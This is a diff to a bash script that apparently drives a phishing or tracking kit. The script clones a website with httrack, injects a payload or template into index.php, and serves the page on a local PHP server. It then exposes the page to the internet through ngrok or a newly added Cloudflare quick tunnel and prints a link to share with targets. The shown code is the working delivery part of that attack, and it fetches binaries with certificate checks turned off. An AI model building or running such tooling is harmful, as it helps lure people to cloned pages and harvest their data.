@@ -36,11 +36,17 @@ printf "\n"
 stop() {
 
 checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+checkcf=$(ps aux | grep -o "cloudflared" | head -n1)
 checkphp=$(ps aux | grep -o "php" | head -n1)
 #checkssh=$(ps aux | grep -o "ssh" | head -n1)
 if [[ $checkngrok == *'ngrok'* ]]; then
 pkill -f -2 ngrok > /dev/null 2>&1
 killall -2 ngrok > /dev/null 2>&1
+fi
+
+if [[ $checkcf == *'cloudflared'* ]]; then
+pkill -f -2 cloudflared > /dev/null 2>&1
+killall -2 cloudflared > /dev/null 2>&1
 fi
 
 if [[ $checkphp == *'php'* ]]; then
@@ -109,61 +115,98 @@ else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it(apt install unzip). Aborting."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it(apt install wget). Aborting."; exit 1; }
 printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
-arch=$(uname -a | grep -o 'arm' | head -n1)
-arch2=$(uname -a | grep -o 'Android' | head -n1)
-arch3=$(uname -a | grep -o 'amd64' | head -n1)
-if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
+arch=$(uname -m)
+if [[ "$arch" == *'arm'* || "$arch" == *'aarch64'* ]]; then
 wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
-
-if [[ -e ngrok-stable-linux-arm.zip ]]; then
 unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-arm.zip
-else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
-exit 1
-fi
-
-elif [[ $arch3 == *'amd64'* ]] ; then
-
+elif [[ "$arch" == *'x86_64'* ]]; then
 wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1
-
-if [[ -e ngrok-stable-linux-amd64.zip ]]; then
 unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-amd64.zip
 else
-printf "\e[1;93m[!] Download error... \e[0m\n"
-exit 1
-fi
-else
 wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
-if [[ -e ngrok-stable-linux-386.zip ]]; then
 unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-386.zip
-else
-printf "\e[1;93m[!] Download error... \e[0m\n"
-exit 1
-fi
 fi
 fi
 
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server(Turn On Hotspot if on termux) \e[0m\e[1;77m(localhost:3333)\e[0m\e[1;92m...\e[0m\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server... \e[0m\e[1;77m(localhost:3333)\e[0m\e[1;92m...\e[0m\n"
 php -S 0.0.0.0:3333 > /dev/null 2>&1 &
 sleep 2
-printf "\e[1;92m[\e[0m\e[1;77m+\e[1;92m] Starting ngrok server(Hotspot must be started) \e[0m\e[1;77m(http 3333)\e[0m\e[1;92m...\n"
+printf "\e[1;92m[\e[0m\e[1;77m+\e[1;92m] Starting ngrok server... \e[0m\e[1;77m(http 3333)\e[0m\e[1;92m...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url' 2>/dev/null)
+if [[ -z "$link" || "$link" == "null" ]]; then
+  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[bc0-9a-z.-]*\.ngrok[a-z0-9.-]*")
+fi
 
 if [[ -z $link ]];then
-printf "\e[1;91m[!] Ngrok error, debug:\e[0m\e[1;77m ./ngrok http 3333\e[0m\n"
+printf "\e[1;91m[!] Ngrok error. Possible causes:\n"
+printf "    1. No internet connection\n"
+printf "    2. Ngrok requires an authtoken (Run: ./ngrok authtoken YOUR_TOKEN)\n"
+printf "    3. Port 3333 is already in use\n"
 exit 1
 fi
 printf "\e[1;92m[\e[0m+\e[1;92m] Share \e[0m\e[1;77mHTTPS\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n" $link
 
+}
+
+cloudflare_server() {
+if [[ -e cloudflared ]]; then
+echo ""
+else
+command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it(apt install wget). Aborting."; exit 1; }
+printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
+arch=$(uname -m)
+if [[ "$arch" == *'x86_64'* ]]; then
+wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
+elif [[ "$arch" == *'arm'* || "$arch" == *'aarch64'* ]]; then
+wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared
+else
+wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared
+fi
+fi
+chmod +x cloudflared
+
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server... \e[0m\e[1;77m(localhost:3333)\e[0m\e[1;92m...\e[0m\n"
+php -S 0.0.0.0:3333 > /dev/null 2>&1 &
+sleep 2
+
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting Cloudflare tunnel...\n"
+rm -rf cf.log
+./cloudflared tunnel --url http://127.0.0.1:3333 > cf.log 2>&1 &
+
+while true; do
+  link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' cf.log)
+  if [[ -n "$link" ]]; then
+    break
+  fi
+  printf "\e[1;93m[\e[0m*\e[1;93m] Waiting for Cloudflare link...\e[0m\r"
+  sleep 1
+done
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Share \e[0m\e[1;77mHTTPS\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n" $link
+}
+
+tunnel_menu() {
+printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose Port Forwarding Service:\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok (Manual Token)\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Cloudflare (No Token)\e[0m\n"
+read -p $'\n\e[1;92m[\e[0m+\e[0m\e[1;92m] Choose an option: \e[0m' tunnel_opt
+tunnel_opt="${tunnel_opt:-1}"
+if [[ "$tunnel_opt" == "1" ]]; then
+  ngrok_server
+elif [[ "$tunnel_opt" == "2" ]]; then
+  cloudflare_server
+else
+  printf "\e[1;93m [!] Invalid option, using Ngrok.\e[0m\n"
+  ngrok_server
+fi
 }
 
 start() {
@@ -196,7 +239,7 @@ fi
 
 httrack --clean -Q -q -K -* --index -O websites/ $website_mirror > /dev/null 2>&1
 payload
-ngrok_server
+tunnel_menu
 checkfound
 
 
@@ -213,7 +256,7 @@ fi
 
 cat $website_template > index.php
 cat template.html >> index.php
-ngrok_server
+tunnel_menu
 checkfound
 
 else
